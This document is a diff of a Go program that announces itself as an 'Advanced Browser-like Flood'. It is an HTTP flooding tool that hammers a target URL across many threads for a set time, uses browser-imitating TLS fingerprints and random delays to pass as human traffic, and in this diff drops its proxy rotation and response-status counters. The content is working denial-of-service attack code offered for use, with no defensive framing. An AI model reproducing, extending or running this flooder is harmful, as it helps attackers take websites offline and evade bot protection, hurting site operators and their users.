@@ -8,7 +8,6 @@ import (
 	"os"
 	"strconv"
 	"strings"
-	"sync/atomic"
 	"time"
 
 	"github.com/bogdanfinn/tls-client/profiles"
@@ -46,36 +45,15 @@ var (
 		"zh-CN,zh;q=0.9,en;q=0.8",
 	}
 
-	proxies []string
 	cached  = false
 	rate    int
 	target  string
-	
-	status_200   uint64
-	status_403   uint64
-	status_5xx   uint64
-	status_other uint64
 )
 
 func main() {
 	rand.Seed(time.Now().UnixNano())
-	if len(os.Args) < 6 {
-		log.Fatalf("Usage: %s <url> <rate> <secs> <threads> <proxies.txt> [--cached]", os.Args[0])
-	}
-	
-	proxiesString, err := os.ReadFile(os.Args[5])
-	if err != nil {
-		log.Fatal("Failed to read proxy file")
-	}
-	allProxies := strings.Split(strings.ReplaceAll(string(proxiesString), "\r\n", "\n"), "\n")
-	// Filter out empty lines
-	for _, proxy := range allProxies {
-		if strings.TrimSpace(proxy) != "" {
-			proxies = append(proxies, strings.TrimSpace(proxy))
-		}
-	}
-	if len(proxies) == 0 {
-		log.Fatal("No valid proxies found in file")
+	if len(os.Args) < 5 {
+		log.Fatalf("Usage: %s <url> <rate> <secs> <threads> [--cached]", os.Args[0])
 	}
 	
 	lol, err := url.Parse(os.Args[1])
@@ -112,7 +90,6 @@ func main() {
 			go flooder()
 		}
 	}
-	go nuller()
 	fmt.Println("Advanced Browser-like Flood by Context7 x bogdanfinn/tls-client!\nEnjoy realistic flooding...")
 	time.Sleep(time.Duration(secs) * time.Second)
 }
@@ -226,19 +203,8 @@ func prepareUrl(urlToModify string) string {
 
 func flooder() {
 	for {
-		proxyString := proxies[rand.Intn(len(proxies))]
-		if strings.TrimSpace(proxyString) == "" {
-			continue
-		}
-		
 		c, err := createRealisticClient()
 		if err != nil {
-			continue
-		}
-		
-		err = c.SetProxy(fmt.Sprintf("http://%s", strings.TrimSpace(proxyString)))
-		if err != nil {
-			c.CloseIdleConnections()
 			continue
 		}
 		
@@ -260,16 +226,6 @@ func flooder() {
 				
 				res.Body.Close()
 				
-				if res.StatusCode == 200 {
-					atomic.AddUint64(&status_200, 1)
-				} else if res.StatusCode == 403 {
-					atomic.AddUint64(&status_403, 1)
-				} else if res.StatusCode < 600 && res.StatusCode > 499 {
-					atomic.AddUint64(&status_5xx, 1)
-				} else {
-					atomic.AddUint64(&status_other, 1)
-				}
-				
 				// Random small delay to simulate human behavior
 				if rand.Intn(20) == 0 {
 					time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
@@ -282,19 +238,8 @@ func flooder() {
 
 func flooderCached() {
 	for {
-		proxyString := proxies[rand.Intn(len(proxies))]
-		if strings.TrimSpace(proxyString) == "" {
-			continue
-		}
-		
 		c, err := createRealisticClient()
 		if err != nil {
-			continue
-		}
-		
-		err = c.SetProxy(fmt.Sprintf("http://%s", strings.TrimSpace(proxyString)))
-		if err != nil {
-			c.CloseIdleConnections()
 			continue
 		}
 		
@@ -331,16 +276,6 @@ func flooderCached() {
 				
 				res.Body.Close()
 				
-				if res.StatusCode == 200 {
-					atomic.AddUint64(&status_200, 1)
-				} else if res.StatusCode == 403 {
-					atomic.AddUint64(&status_403, 1)
-				} else if res.StatusCode < 600 && res.StatusCode > 499 {
-					atomic.AddUint64(&status_5xx, 1)
-				} else {
-					atomic.AddUint64(&status_other, 1)
-				}
-				
 				// Random small delay to simulate human behavior
 				if rand.Intn(20) == 0 {
 					time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
@@ -348,17 +283,5 @@ func flooderCached() {
 			}
 		}
 		c.CloseIdleConnections()
-	}
-}
-
-func nuller() {
-	fmt.Printf("REALISTIC BROWSER STATS:\n200 OK: %d\n403 FBDN: %d\n5xx DROP: %d\nOTHER: %d\n", status_200, status_403, status_5xx, status_other)
-	for {
-		time.Sleep(1 * time.Second)
-		fmt.Printf("\033[1A\033[2K\033[1A\033[2K\033[1A\033[2K\033[1A\033[2K\033[1A\033[2KREALISTIC BROWSER STATS:\n200 OK: %d\n403 FBDN: %d\n5xx DROP: %d\nOTHER: %d\n", status_200, status_403, status_5xx, status_other)
-		atomic.StoreUint64(&status_200, 0)
-		atomic.StoreUint64(&status_403, 0)
-		atomic.StoreUint64(&status_5xx, 0)
-		atomic.StoreUint64(&status_other, 0)
 	}
 }
